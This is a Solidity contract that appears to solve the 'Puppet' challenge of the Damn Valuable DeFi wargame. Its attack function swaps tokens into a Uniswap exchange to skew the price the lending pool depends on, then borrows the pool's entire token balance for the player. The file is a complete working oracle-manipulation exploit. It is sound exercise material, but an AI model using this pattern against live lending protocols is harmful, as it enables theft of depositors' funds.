//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

interface IPuppetPool{
    function borrow(
        uint256 amount, 
        address recipient
        ) external payable;
}

interface IUniswap{
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256);
}

contract AttackerPuppet{
    IPuppetPool immutable pool;
    address immutable player;
    IUniswap immutable exchange;
    DamnValuableToken immutable token;

    constructor(address _pool,address _uniswap,address _token,address _player){
        pool = IPuppetPool(_pool);
        exchange = IUniswap(_uniswap);
        token = DamnValuableToken(_token);
        player = _player;

    }

    function attack() external payable{
        // buy
        uint256 token_amount = token.balanceOf(address(this));
        token.approve(address(exchange),token_amount);
        exchange.tokenToEthSwapInput(token_amount,9,block.timestamp + 60);
        //borrow
        uint256 eth_amount = address(this).balance;
        // console.log(eth_amount);
        uint256 pool_token_amount = token.balanceOf(address(pool));
        pool.borrow{value:eth_amount}(pool_token_amount, player);
    }

    receive() external payable{}

}